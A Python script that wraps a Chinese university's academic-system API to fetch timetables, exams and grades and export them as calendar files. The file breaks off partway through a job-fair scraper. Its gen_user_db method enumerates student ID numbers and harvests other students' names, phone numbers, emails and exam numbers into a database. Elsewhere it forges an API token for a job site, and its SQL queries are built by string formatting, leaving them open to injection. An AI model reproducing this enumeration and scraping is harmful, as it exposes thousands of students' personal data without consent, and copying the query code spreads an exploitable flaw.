# !/bin/python3
# -*- coding=utf-8 -*-


"""
API 列表来源： https://github.com/TLingC/QZAPI_Archive
"""

import json
import os
import sys
import gzip
import random
import sqlite3
import aiohttp
import asyncio
import threading
import traceback
import time
import uuid
from datetime import datetime, timedelta
from random import randint

import pytz
import requests
# import getopt
# import getpass
from icalendar import Calendar, Event

# def get_username_password(self):
#     """
#     解析命令行参数 得到用户名和密码
#     """

#     try:
#         opts, args = getopt.getopt(
#             self.argv[1:], 'hu:p:', ['username=', 'password='])
#     except getopt.GetoptError:
#         print('你的打开方式不对！请重新输入命令')
#         print('HUT.py -u <username> -p <password>')
#         sys.exit(-1)
#     for opt, arg in opts:
#         if opt in ('-h', '--help', 'help'):
#             print('usage: python %s -')
#         if opt in ('-u', '--username'):
#             self.username = arg
#         elif opt in ('-p', '--password'):
#             self.password = arg
#     if "username" not in locals().keys():
#         self.username = input("请输入学号：")
#     if "password" not in locals().keys():
#         self.password = getpass.getpass("请输入密码（无回显）：")

UserAgent = (
    ('Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) '
        'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
        'Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190503 '
        'Mobile Safari/537.36 MMWEBID/443 '
        'MicroMessenger/7.0.5.1440(0x27000536) '
        'Process/tools NetType/4G Language/zh_CN '
        'MicroMessenger/7.0.5.1440(0x27000536) '
        'Process/tools NetType/4G Language/zh_CN miniProgram'),
    ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) '
        'AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'),
    ('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) '
        'AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25'),
    ('Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) '
        'AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27'),
    ('Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-cn) '
        'AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5'),
    ('Mozilla/5.0 (X11; U; Linux x86_64; en-us) '
        'AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+'),
    ('Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) '
        'AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1'),
    ('Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) '
        'AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931')
)


async def async_req(method, url, **kwargs):
    async with aiohttp.ClientSession() as session:
        if(method == 'GET'):
            res = await session.get(url, timeout=kwargs.get('timeout'),
                                    params=kwargs.get('params'),
                                    headers=kwargs.get('headers')
                                    )
            return await res.json()
        if(method == 'POST'):
            res = await session.post(url, timeout=kwargs.get('timeout'),
                                     data=kwargs.get('data'),
                                     headers=kwargs.get('headers')
                                     )
            return await res.json()


class Stu_SqliteDb(object):
    def __init__(self, filename='HUT.db'):
        self.conn = sqlite3.connect(filename)
        print("Opened database successfully")
        self.cur = self.conn.cursor()
        try:
            self.cur.execute('''CREATE TABLE IF NOT EXISTS STUDENT
                    (ID INTEGER PRIMARY KEY AUTOINCREMENT,
                    RXNF        CHAR(5),
                    NJ          CHAR(5),
                    YXMC        CHAR(30),
                    ZYMC        CHAR(15),
                    BJ          CHAR(15),
                    XH          CHAR(15)    NOT NULL,
                    XM          TEXT    NOT NULL,
                    XB          TEXT     NOT NULL,
                    DH          CHAR(15),
                    EMAIL       CHAR(30),
                    KSH         CHAR(15));
                    ''')
            print("Table created successfully")
            self.conn.commit()
        except sqlite3.OperationalError:
            traceback.print_exc()
            # sys.exit(0)

    def insert(self, data):
        # return
        execute = ('''INSERT INTO STUDENT (RXNF,NJ,YXMC,ZYMC,BJ,XH,XM,XB,DH,EMAIL,KSH)
        VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')''' % (
            data['rxnf'], data['nj'], data['yxmc'], data['zymc'], data['bj'],
            data['xh'], data['xm'], data['xb'], data['dh'], data['email'], data['ksh']))
        self.cur.execute(execute)
        # self.conn.commit()

    def xh_search(self, xh):
        execute = ("select xh from student where xh is %s" % (xh))
        self.cur.execute(execute)
        return self.cur.fetchall()


class MyThread(threading.Thread):
    def __init__(self, func, *args, **kwargs):
        super(MyThread, self).__init__()
        self.func = func
        self.args = args
        self.kwargs = kwargs

    def run(self):
        self.result = self.func(*self.args, **self.kwargs)

    def get_result(self):
        try:
            return self.result
        except Exception:
            return None


class Student(object):
    def __init__(self, account=-1, password=-1):
        self.account = os.getenv(
            'xh') if account == -1 else account      # 账号，默认使用全局变量 account
        self.password = os.getenv(
            'pwd') if password == -1 else password   # 密码，默认使用全局变量 password
        self.login()

    HEADERS = {
        'User-Agent': random.choice(UserAgent),
        'Referer': 'http://218.75.197.123:83',
        'accept-encoding': 'gzip, deflate, br'
    }

    URL = 'http://218.75.197.123:83/app.do'     # 教务系统地址

    def login(self):
        """ 登录
            返回值:
                {
                    'success': 登录状态,
                    'token': 'Token',
                    'user':{
                        'scsj': None,
                        'sjyzm': None,
                        'useraccount': '登录用户',
                        'usertype': '用户类型，学生为 2',
                        'userdwmc': '学院',
                        'username': '用户姓名',
                        'userpasswd': '用户密码'
                        },
                    'userdwmc': '学院',
                    'userrealname': '用户姓名',
                    'usertype': '用户类型，学生为 2'

                }
        """

        datas = {
            'method': 'authUser',
            'xh': self.account,
            'pwd': self.password
        }
        res = requests.post(self.URL, data=datas,
                            timeout=5, headers=self.HEADERS)
        res = res.json()
        if res['success']:
            self.HEADERS['token'] = res['token']
        else:
            self.HEADERS['token'] = res['token']
            print(res['msg'])
            # exit(0)

    def get_data(self, params):
        loop = asyncio.get_event_loop()
        res = loop.run_until_complete(
            async_req('GET', url=self.URL, params=params, headers=self.HEADERS))
        return res

    def get_current_time(self):
        """ 获取当前时间、周次、学年等信息
            返回数据：
                {
                    'e_time': '周结束时间',
                    's_time': '周开始时间',
                    'xnxqh': '学年',
                    'zc': '周次'
                }
        """

        cur_time = datetime.strftime(
            datetime.now(), '%Y-%m-%d')
        params = {
            'method': 'getCurrentTime',
            'currDate': cur_time
        }
        res = self.get_data(params)
        return res

    def getKbcxAzc(self, zc='', xh=''):
        """ 课表查询,默认查询当前周
            返回数据：
                [
                    {
                        'jsmc': '教室名称',
                        'jssj': '下课时间',
                        'jsxm': '教师姓名',
                        'kcmc': '课程名称',
                        'kkzc': '课程教学周',
                        'kcsj': '课程时间（eg: 50304 表示星期五第3-4节）',
                        'kssj': '上课时间',
                        'sjbz': '未知'
                    }
                ]
        """
        s = self.get_current_time()
        xnxqid = s['xnxqh']
        params = {
            'method': 'getKbcxAzc',
            'xh': xh if xh else self.account,
            'xnxqid': xnxqid,
            'zc': s['zc'] if not zc else zc
        }
        res = self.get_data(params)
        return res

    def getXqcx(self):
        """ 获取校区 ID
            返回值：
                [
                    {
                        'xqid': '1',
                        'xqmc': '河东校区'
                    },
                    {
                        'xqid': '2',
                        'xqmc': '河西校区'
                    }
                ]
        """

        parames = {'method': 'getXqcx'}
        res = self.get_data(parames)
        return res

    def getJxlcx(self, xqids):
        """ 获取校区教学楼信息
            返回值：
                [
                    {
                        'jzwid': '教学楼 ID',
                        'jzwmc': '教学楼名称'
                    }
                ]
        """

        parames = {
            'method': 'getJxlcx',
            'xqid': xqids
        }
        res = self.get_data(parames)
        return res

    def getKxJscx(self, js='0', idleTime='alday',  xqids='', jxlids='', classroomNumbers=''):
        """ 空教室查询
            idleTime取值
                allday：全天
                am：上午
                pm：下午
                night：晚上

            精确查询空教室 (xqid: 校区 id、jxlid: 教学楼 id、classroomNumber： 教室人数)
            classroomNumber
                30：30人以下
                30-40：30-40人
                40-50：40-50人
                60：60人以上
            返回值：
                {
                    'data': [
                        {
                            'jsList': [
                                {
                                    'jsh': '未知',
                                    'jsid': '教室 ID',
                                    'jsmc': '教室名称',
                                    'jzwid': '所在楼ID',
                                    'jzwmc': '教学楼名称',
                                    'xqmc': '校区名称',
                                    'yxzws': 教室容量,
                                    'zws': 未知，和yxzws相同
                                }
                            ],
                            'jxl': '教学楼'
                        }
                    ],
                    'success': 状态,
                    'xnxqid': '学年'
                }
        """

        date = input("请输入查询日期： （格式为 XXXX-XX-XX,默认为当前日期）")
        cur_time = datetime.strftime(
            datetime.now(), '%Y-%m-%d')
        time = date if len(date) != 0 else cur_time

        action = input("请输入查询时间： 1.上午  2.下午  3.晚上（默认为全天，只需输入数字）")
        print("您选择的操作：%s" % action)

        if action in ['1', '2', '3']:
            if action == '1':
                idleTime = 'am'
            elif action == '2':
                idleTime = 'pm'
            elif action == '3':
                idleTime = 'night'

        params = {
            'method': 'getKxJscx',
            'time': time,
            'idleTime': idleTime
        }

        js = input("是否启用精准查询? (默认不启用，0：No 1：Yes)")

        if js == '1':
            while True:
                xqids = input("请输入校区 ID:(1.河东校区  2.河西校区）")
                if xqids not in ['1', '2']:
                    print("输入错误！请重新输入")
                else:
                    break
            while True:
                print(self.getJxlcx(xqids))
                jxlids = input("请输入教学楼 ID:")
                if jxlids not in ['01', '03', '04', '05', '06', '07', '08',
                                  '09', '10', '11', '12', '14', '16', '17',
                                  '18', '19', '20', '21', '22', '23', '24',
                                  '25', '26']:
                    print("输入错误！请重新输入")
                else:
                    break
            params['xqid'] = xqids,
            params['jxlid'] = jxlids,
            params['classroomNumber'] = classroomNumbers

        res = self.get_data(params)
        return res

    def getUserInfo(self, xh=''):
        ''' 获取帐号信息
            返回值：
                {
                    'bj': '班级',
                    'dh': '电话',
                    'dqszj': '未知，与入学年份、年级相同',
                    'email': '电子邮箱',
                    'fxzy': '辅修专业',
                    'ksh': '高考考号',
                    'nj': '年级',
                    'qq': 'QQ 号',
                    'rxnf': '入学年份',
                    'usertype': '用户类别，学生为 2',
                    'xb': '性别',
                    'xh': '学号',
                    'xm': '姓名',
                    'xz': 未知,
                    'yxmc'：'院系名称',
                    'zymc'：'专业名称'
                }
        '''

        params = {
            'method': 'getUserInfo',
            'xh': self.account if not xh else xh
        }
        res = self.get_data(params)
        return res

    def getXnxq(self):
        ''' 获取学年和学期信息
            返回值：
                [
                    {
                        'isdqxq': '是否为当前学期，1 为是，0 为否',
                        'xnxq01id': '学年id',
                        'xqmc': '学年名称'
                    }
                ]
        '''

        params = {
            'method': 'getXnxq',
            'xh': self.account
        }
        res = self.get_data(params)
        return res

    def getCjcx(self, id=''):
        """ 获取成绩信息
                返回值：
                    {
                        'result': [
                            {
                                'bz': 未知,
                                'cjbsmc': 未知,
                                'kclbmc': '课程类别名称',
                                'kcmc': '课程名称',
                                'kcxzmc': '课程性质名称',
                                'kcywmc': 未知,
                                'ksxzmc': '考试性质名称',
                                'xf': 学分,
                                'xm': '姓名',
                                'xqmc': '学期名称',
                                'zcj': '总成绩'
                            }
                        ]，
                        'success': 状态
                    }
        """

        params = {
            'method': 'getCjcx',
            'xh': self.account,
            'xnxqid': id
        }
        res = self.get_data(params)
        return res

    def getKscx(self):
        """获取考试信息"""

        params = {
            'method': 'getKscx',
            'xh': self.account
        }
        res = self.get_data(params)
        return res

    def gen_Kb_json_data(self, xh=''):
        """
            生成所有课程的 json 数据
        """
        data = []
        for i in range(1, 31):
            # t = MyThread(self.getKbcxAzc, zc=i, xh=xh)
            # t. start()
            # t.join()
            # res = t.get_result()
            res = self.getKbcxAzc(zc=i, xh=xh)
            if res:
                print('正在获取第 %d 周课表' % i)
                for j in res:
                    if j not in data:
                        data.append(j)
        return data

    def gen_Kb_web_data(self, xh='', kb=''):
        """
            生成网页所需的总课表数据
        """
        data = {}
        kb = kb if kb else self.gen_Kb_json_data(xh)
        # print(kb)
        for i in range(1, 8):
            for j in range(1, 8):
                data['kb' + str(i)+'_'+str(j)] = '&nbsp;'
        for i in kb:
            if(len(i['kcsj'][4:]) == 1):
                dic_key = 'kb' + i['kcsj'][0:1]+'_' + \
                    str(int((int(i['kcsj'][2:3])+int(i['kcsj'][-1:])+1)/4))
            else:
                dic_key = 'kb' + i['kcsj'][0:1]+'_' + \
                    str(int((int(i['kcsj'][2:3])+int(i['kcsj'][4:5])+1)/4))
                key2 = 'kb' + i['kcsj'][0:1]+'_' + \
                    str(int((int(i['kcsj'][6:7])+int(i['kcsj'][-1:])+1)/4))
            if data[dic_key] != '&nbsp;':
                m = data[dic_key]['multy']
                m += 1
                data[dic_key]['multy'] = m
                data[dic_key]['multy' + str(m)] = {
                    'kcmc': i['kcmc'],
                    'jsxm': i['jsxm'],
                    'kkzc': i['kkzc'],
                    'jsmc': i['jsmc']
                }
                if('key2' in locals()):
                    data[key2] = data[dic_key]
                    del key2
            else:
                data[dic_key] = {
                    'multy': 0,
                    'kcmc': i['kcmc'],
                    'jsxm': i['jsxm'],
                    'kkzc': i['kkzc'],
                    'jsmc': i['jsmc']
                }
                if('key2' in locals()):
                    data[key2] = data[dic_key]
                    del key2
        data['user'] = self.getUserInfo(xh)
        return data

    def gen_user_db(self, db):
        self.db = db
        data = {
            'method': 'getUserInfo'
        }
        xy_list = json.load(open('学院.json', 'r'))
        xy_zys = []
        for xy in xy_list:
            for id in xy['ids']:
                for zy in id['zy']:
                    xy_zys.append((id['id'], zy['id']))

        njs = ('19', '18', '17', '16')
        bj = 0
        id = 0

        for nj in njs:
            print(nj)
            for xy_zy in xy_zys:
                print(xy_zy)
                # time.sleep(5)
                if(nj == '17' and xy_zy[0] == '408' and xy_zy[1] == '00'):
                    bj = 10
                while(True):
                    data['xh'] = str(nj) + xy_zy[0] + xy_zy[1] + \
                        str(bj).zfill(2) + str(id).zfill(2)
                    if(not self.db.xh_search(data['xh'])):
                        # t = MyThread(self.get_data, data)
                        # t.start()
                        # t.join()
                        # res = t.get_result()
                        res = self.get_data(data)
                    else:
                        res = 'break'
                    if(res):
                        # 有数据表明当前班级号正确
                        if(res != 'break'):
                            print('Insert=====>', res)
                            self.db.insert(res)
                        # print(res)
                        # 获取此班级所有学生
                        while(True):
                            id += 1
                            if((xy_zy[1] in ('00', '11', '15', '70')) or xy_zy[0] == '110'):
                                if(id % 30 == 0):
                                    print('long id sleep %.2f' %
                                          (id/100))
                                    time.sleep(id/100)
                            data['xh'] = str(
                                nj) + xy_zy[0] + xy_zy[1] + str(bj).zfill(2) + str(id).zfill(2)
                            if(not self.db.xh_search(data['xh'])):
                                # t = MyThread(self.get_data, data)
                                # t.start()
                                # t.join()
                                # res = t.get_result()
                                res = self.get_data(data)
                            else:
                                res = 'break'
                            if(res):
                                # 有数据表明当前班级号正确
                                if(res != 'break'):
                                    print('Insert=====>', res)
                                    self.db.insert(res)
                                    # print(res)
                            else:
                                break
                    else:
                        # 防止当某个班级没有 00 这个编号时出现直接跳过此班级的情况
                        while(True):
                            id += 1
                            if((xy_zy[1] in ('00', '11', '15', '70')) or xy_zy[0] == '110'):
                                if(id % 30 == 0):
                                    print('long id sleep %.2f' %
                                          (id/100))
                                    time.sleep(id/100)
                            data['xh'] = str(
                                nj) + xy_zy[0] + xy_zy[1] + str(bj).zfill(2) + str(id).zfill(2)
                            if(not self.db.xh_search(data['xh'])):
                                # t = MyThread(self.get_data, data)
                                # t.start()
                                # t.join()
                                # res = t.get_result()
                                res = self.get_data(data)
                            else:
                                res = 'break'
                            if(res):
                                # 有数据表明当前班级号正确
                                if(res != 'break'):
                                    print('Insert=====>', res)
                                    self.db.insert(res)
                                    # print(res)
                            else:
                                break
                        # 跑完一个班级，班级号加一，班级编号重置为0
                        bj += 1
                        # 处理4080012 之后直接调到 4080020
                        if(nj == '17' and xy_zy[0] == '408' and xy_zy[1] == '00'):
                            if(bj == 13):
                                bj = 20
                        id = 0
                        data['xh'] = str(nj) + xy_zy[0] + xy_zy[1] + \
                            str(bj).zfill(2) + str(id).zfill(2)
                        # t = MyThread(self.get_data, data)
                        # t.start()
                        # t.join()
                        # res = t.get_result()
                        res = self.get_data(data)

                        # 防止当班级加一后无00编号导致直接跳过此专业
                        if(not res):
                            id += 1
                            data['xh'] = str(nj) + xy_zy[0] + xy_zy[1] + \
                                str(bj).zfill(2) + str(id).zfill(2)
                        if(not res and not self.get_data(data)):
                            # 无数据表明已跑完此专业所有班级，将班级号和班级编号置0(17级计算机班级从10开始)，跳出循环进行下一个专业查询
                            if(nj == '17' and xy_zy[0] == '408' and xy_zy[1] == '00'):
                                bj = 10
                            else:
                                bj = 0
                            id = 0
                            break
        self.db.conn.commit()
        self.db.conn.close()


class CurriculumCalendar(object):
    def __init__(self, account=-1, password=-1, filename='kb.ics'):
        self.account = os.getenv(
            'xh') if account == -1 else account      # 账号，默认使用全局变量 account
        self.password = os.getenv(
            'pwd') if password == -1 else password   # 密码，默认使用全局变量 password
        self.student = Student(self.account, self.password)
        self.start_date = self.get_start_date()    # 学期起始日期，格式为 %Y-%m-%d
        self.filename = filename        # 日历文件名

    def get_start_date(self):
        res = self.student.get_current_time()
        start_date_datetime = datetime.strptime(res['s_time'], "%Y-%m-%d") \
            - timedelta(days=(int(res['zc'])-1)*7)
        return datetime.strftime(
            start_date_datetime, '%Y-%m-%d')

    def gen_cal(self, xh='', datas=()):
        """
            生成日历文件，文件名为 self.filename，路径为当前路径
        """
        self.datas = self.student.gen_Kb_json_data(xh) if (
            not datas) else datas   # 所有课程的 json 数据

        tz = pytz.timezone('Asia/Shanghai')

        cal = Calendar()
        cal.add('PRODID', '-//Hoshizora //iCalendar 4.0.3')
        cal.add('VERSION', '2.0')
        cal.add('CALSCALE', 'GREGORIAN')
        # print(self.data)
        for j in self.datas:
            event = Event()
            try:
                for k in j['kkzc'].split(','):
                    sta_week, end_week = k.split('-')
                    self.start_date_datetime = datetime.strptime(self.start_date, "%Y-%m-%d") + \
                        timedelta(days=(int(sta_week)-1) *
                                  7+(int(j['kcsj'][:1]) - 1))
                    end_date_datetime = self.start_date_datetime + \
                        timedelta(days=(int(end_week)-1) *
                                  7+(int(j['kcsj'][:1]) - 1))
                    sta_year, sta_mon, sta_day = datetime.strftime(
                        self.start_date_datetime, '%Y-%m-%d').split('-')
                    end_year, end_mon, end_day = datetime.strftime(
                        end_date_datetime, '%Y-%m-%d').split('-')

                    sta_hour, sta_minu = j['kssj'].split(':')
                    end_hour, end_minu = j['jssj'].split(':')

                    # print("*"*50)
                    # print(datetime(int(sta_year), int(sta_mon), int(
                    #     sta_day), int(sta_hour), int(sta_minu), 0))
                    # print(datetime(int(sta_year), int(sta_mon), int(
                    #     sta_day), int(end_hour), int(end_minu), 0))
                    # print("*"*50)
                    # print(j)
                    # print('>'*50)

                    event.add('DTSTAMP', datetime.now())
                    event.add('DTSTART', datetime(int(sta_year), int(sta_mon),
                                                  int(sta_day), int(sta_hour),
                                                  int(sta_minu), 0, tzinfo=tz))
                    event.add('DTEND', datetime(int(sta_year), int(sta_mon),
                                                int(sta_day), int(end_hour),
                                                int(end_minu), 0, tzinfo=tz))
                    event.add('SUMMARY', j['kcmc'])
                    event.add('UID', str(uuid.uuid1()))
                    event.add('LOCATION', '%s %s' %
                              (j['jsmc'], j['jsxm']))
                    event.add('DESCRIPTION', '第%s节 - 第%s节\n%s\n%s' %
                              (j['kcsj'][2:3], j['kcsj'][-1:], j['jsmc'], j['jsxm']))
                    parameters = {
                        'FREQ': 'WEEKLY',
                        'UNTIL': datetime(int(end_year), int(end_mon), int(end_day), int(end_hour), int(end_minu), 0,
                                          tzinfo=tz),
                        'INTERVAL': '1'
                    }
                    event.add('RRULE', parameters)
                    cal.add_component(event)
            except ValueError:
                sta_week = j['kkzc']
                end_week = j['kkzc']
                self.start_date_datetime = datetime.strptime(self.start_date, "%Y-%m-%d") + \
                    timedelta(days=(int(sta_week)-1) *
                              7+(int(j['kcsj'][:1]) - 1))
                end_date_datetime = self.start_date_datetime + \
                    timedelta(days=(int(end_week)-1) *
                              7+(int(j['kcsj'][:1]) - 1))
                sta_year, sta_mon, sta_day = datetime.strftime(
                    self.start_date_datetime, '%Y-%m-%d').split('-')
                end_year, end_mon, end_day = datetime.strftime(
                    end_date_datetime, '%Y-%m-%d').split('-')

                sta_hour, sta_minu = j['kssj'].split(':')
                end_hour, end_minu = j['jssj'].split(':')

                # print("*"*50)
                # print(datetime(int(sta_year), int(sta_mon), int(
                #     sta_day), int(sta_hour), int(sta_minu), 0))
                # print(datetime(int(sta_year), int(sta_mon), int(
                #     sta_day), int(end_hour), int(end_minu), 0))
                # print("*"*50)
                # print(j)
                # print('>'*50)

                event.add('DTSTAMP', datetime.now())
                event.add('DTSTART', datetime(int(sta_year), int(sta_mon),
                                              int(sta_day), int(sta_hour),
                                              int(sta_minu), 0, tzinfo=tz))
                event.add('DTEND', datetime(int(sta_year), int(sta_mon), int(sta_day), int(end_hour), int(end_minu), 0,
                                            tzinfo=tz))
                event.add('SUMMARY', j['kcmc'])
                event.add('UID', str(uuid.uuid1()))
                event.add('LOCATION', '%s %s' %
                          (j['jsmc'], j['jsxm']))
                event.add('DESCRIPTION', '第%s节 - 第%s节\n%s\n%s' %
                          (j['kcsj'][2:3], j['kcsj'][-1:], j['jsmc'], j['jsxm']))
                parameters = {
                    'FREQ': 'WEEKLY',
                    'UNTIL': datetime(int(end_year), int(end_mon), int(end_day), int(end_hour), int(end_minu), 0,
                                      tzinfo=tz),
                    'INTERVAL': '1'
                }
                event.add('RRULE', parameters)
                cal.add_component(event)
        # print(str(cal.to_ical(), encoding='utf8'))

        with open(self.filename, 'w', encoding='utf8') as f:
            f.write(str(cal.to_ical(), encoding='utf8'))


class ExaminationCalendar(object):
    """
        生成考试日历
    """

    def __init__(self, account=-1, password=-1, filename='ks.ics'):
        self.account = os.getenv(
            'xh') if account == -1 else account      # 账号，默认使用全局变量 account
        self.password = os.getenv(
            'pwd') if password == -1 else password   # 密码，默认使用全局变量 password
        self.student = Student(self.account, self.password)
        self.filename = filename        # 日历文件名

    def gen_cal(self):
        tz = pytz.timezone('Asia/Shanghai')
        cal = Calendar()
        cal.add('PRODID', '-//Hoshizora //iCalendar 4.0.3')
        cal.add('VERSION', '2.0')
        cal.add('CALSCALE', 'GREGORIAN')
        for data in self.student.getKscx():
            event = Event()
            event.add('DTSTAMP', datetime.now())

            date, time_ = data['ksqssj'].split(' ')
            sta_year, sta_mon, sta_day = date.split('-')
            sta_time, end_time = time_.split('~')
            sta_hour, sta_minu = sta_time.split(':')
            end_hour, end_minu = end_time.split(':')
            event.add('DTSTART', datetime(int(sta_year), int(sta_mon),
                                          int(sta_day), int(sta_hour),
                                          int(sta_minu), 0, tzinfo=tz))
            event.add('DTEND', datetime(int(sta_year), int(sta_mon),
                                        int(sta_day), int(end_hour),
                                        int(end_minu), 0, tzinfo=tz))
            event.add('SUMMARY', data['ksmc'] + '-' + data['kcmc'])
            event.add('UID', str(uuid.uuid1()))
            event.add('LOCATION', '%s' % data['jsmc'])
            event.add('DESCRIPTION', '%s\n%s' % (data['kcmc'], data['ksjc']))
            cal.add_component(event)

        return(str(cal.to_ical(), encoding='utf8'))

        # with open(self.filename, 'w', encoding='utf8') as f:
        #     f.write(str(cal.to_ical(), encoding='utf8'))


class ElectricityFeeInquiry(object):
    URL = 'http://h5cloud.17wanxiao.com:8080/CloudPayment/user/getRoom.do'
    HEADERS = {
        'User-Agent': ('Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/PKQ1.180904.001; wv) '
                       'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
                       'Chrome/74.0.3729.157 Mobile Safari/537.36 Wanxiao/5.0.2'),
        'Referer': ('http://h5cloud.17wanxiao.com:8080'
                    '/CloudPayment/bill/selectPayProject.do'
                    '?txcode=elecdetails&interurl=elecdetails&payProId=1567'
                    '&amtflag=0&payamt=0&payproname=%E8%B4%AD%E7%94%B5%E6%94%AF%E5%87%BA'
                    '&img=https://cloud.59wanmei.com:8443/CapecYunPay/images/project/img-nav_2.png&subPayProId='),
        'accept-encoding': 'gzip, deflate'
    }

    def __init__(self):
        # self.payProId = randint(1000, 2000)
        self.payProId = 1000

    def get_data(self, params):
        while(True):
            try:
                req = requests.get(self.URL, params=params,
                                   timeout=5, headers=self.HEADERS)
                if(req.status_code == 200):
                    res = json.loads(req.text)
                    if(res['roomlist']):
                        break
                    else:
                        self.payProId = randint(1000, 1500)
            except requests.exceptions.ConnectTimeout:
                traceback.print_exc()
                time.sleep(2)
        # print(req.url)
        return res

    def getJzinfo(self, optype=1, arieaid=4, buildid=0, levelid=0):
        """
            获取编号
            arieaid: 校区 id
            buildid： 楼栋 id
        """
        params = {
            'payProId': self.payProId,
            'schoolcode': 786,
            'optype': optype,
            'areaid': arieaid,
            'buildid': buildid,
            'unitid': 0,
            'levelid': levelid,
            'businesstype': 2
        }
        res = self.get_data(params)
        return res


class JobCalendar(object):
    '''
        学校列表：http://bibibi.net/tour/admin/tag/hzgx.htm
    '''

    school_list = {'jndx': "暨南大学", 'hndx': "湖南大学", 'xtdx': "湘潭大学",
                   'cslg': "长沙理工大学", 'hngydx': "湖南工业大学", 'nhdx': "南华大学",
                   'hnkjdx': "湖南科技大学", 'hnuc''hnnydx': "华南农业大学", 'nfykdx': "南方医科大学",
                   'nfkjdx': "南方科技大学", 'gdcj': '广东财经大学', 'ccgydx': "长春工业大学",
                   'cczyy': "长春中医药大学", 'cccjxy': "长春财经学院", 'bhdx': "北华大学",
                   'jlcjdx': "吉林财经大学", 'thsfxy': "通化师范学院", 'lndx': "辽宁大学",
                   'zgyk': "中国医科大学", 'gzdxhrrjxy': "广州大学华软软件学院",
                   'sygy': "沈阳工业大学", 'sysf': "沈阳师范大学", 'lnzyxy': "辽宁职业学院",
                   'kmlg': "昆明理工大学", 'ynmzdx': "云南名族大学", 'ynnd': "云南农业大学",
                   'xnly': "西南林业大学", 'yncjdx': "云南财经大学", 'kmykdx': "昆明医科大学",
                   'jxny': "江西农业大学", 'jxcj': "江西财经大学", 'jxwywmzy': "江西外语外贸职业学院",
                   'yjlgxy': "燕京理工学院", 'kdxy': "首都师范大学科德学院", 'bjgsjhxy': "北京工商大学嘉华学院"
                   }
    TOKEN = 'yxqqnn0000000' + str(randint(0, 135)).zfill(3)

    HEADERS = {
        'Host': 'bibibi.net',
        'User-Agent': random.choice(UserAgent)
    }

    def __init__(self, school='hngydx', mode='getcareers', m=14, style='simple'):
        self.HOST = '{school_name}.bibibi.net'.format(
            school_name=school if(school in self.school_list.keys()) else 'hngydx')
        self.HEADERS['Host'] = self.HOST
        self.CAREER_INFO_URL = 'http://' + self.HOST + '/detail/career?id='
        self.CAREER_INFO_API_URL = 'http://student.bibibi.net/index.php?r=career/ajaxgetcareerdetail&token={TOKEN}&career_id='.format(
            TOKEN=self.TOKEN)
        self.FAIR_INFO_URL = 'http://' + self.HOST + '/detail/jobfair?id='
        self.FAIR_INFO_API_URL = 'https://student.bibibi.net/index.php?r=chance/ajaxgetjobfairdetail&token={TOKEN}&fair_id='.format(
            TOKEN=self.TOKEN)

        self.mode = mode
        self.style = style
        self.url = 'http://' + self.HOST + '/module/' + mode

        self.dates = []
        for i in range(m):
            self.dates.append(datetime.strftime(
                datetime.now() + timedelta(days=i), '%Y-%m-%d'))
        self.cal = Calendar()
        self.session = requests.Session()

    def get_datas(self, **kwargs):
        params = {
            'start': kwargs['start'] if('start' in kwargs.keys()) else 0,
            'count': kwargs['count'] if('count' in kwargs.keys()) else 100,
            'keyword': kwargs['keyword'] if('keyword' in kwargs.keys()) else '',
            'address': kwargs['address'] if('address' in kwargs.keys()) else '',
            'type': kwargs['type'] if('type' in kwargs.keys()) else 'inner'
        }
        if(self.mode == 'getcareers'):
            params['professionals'] = kwargs['professionals'] if(
                'professionals' in kwargs.keys()) else ''
            params['career_type'] = kwargs['career_type'] if(
                'career_type' in kwargs.keys()) else ''
            self.HEADERS['Referer'] = 'http://{HOST}/module/careers'.format(
                HOST=self.HOST)
        elif(self.mode == 'getjobfairs'):
            params['organisers'] = kwargs['organisers'] if(
                'organisers' in kwargs.keys()) else ''
            params['type'] = None if(params['type'] == 'inner') else 2
            self.HEADERS['Referer'] = 'http://{HOST}/module/jobfairs'.format(
                HOST=self.HOST)

        datas = []
        # print(self.dates)
        for date in self.dates:
            params['day'] = date
            while(True):
                try:
                    # s = self.session.get(
                    #     self.url, params=params, headers=self.HEADERS)
                    t = MyThread(self.session.get, self.url,
                                 params=params, headers=self.HEADERS)
                    t.start()
                    t.join()
                    time.sleep(0.5)
                    res = t.get_result()
                    # print(res.url)
                    if(res.status_code != 200):
                        break
                    res = res.json()
                    # print('>' * 50)
                    if(res['data']):
                        for data in res['data']:
                            if(self.mode == 'getcareers' and self.style != 'simple'):
                                career_res = self.session.get(
                                    self.CAREER_INFO_API_URL + data['career_talk_id'])
                                career_res = career_res.json()
                                data['remark'] = career_res['data']['remark']
                            else:
                                fair_res = self.session.get(
                                    self.FAIR_INFO_API_URL + data['fair_id'])
                                fair_res = res.json()
                                companys = []
                                for job in fair_res['data']['job_list']:
                                    if(job['company_name'] not in companys):
                                        companys.append(job['company_name'])
                                company_str = ', '.join(companys)
                                data['company_name'] = company_str
                            datas.append(data)
                    break
                except requests.exceptions.ConnectTimeout:
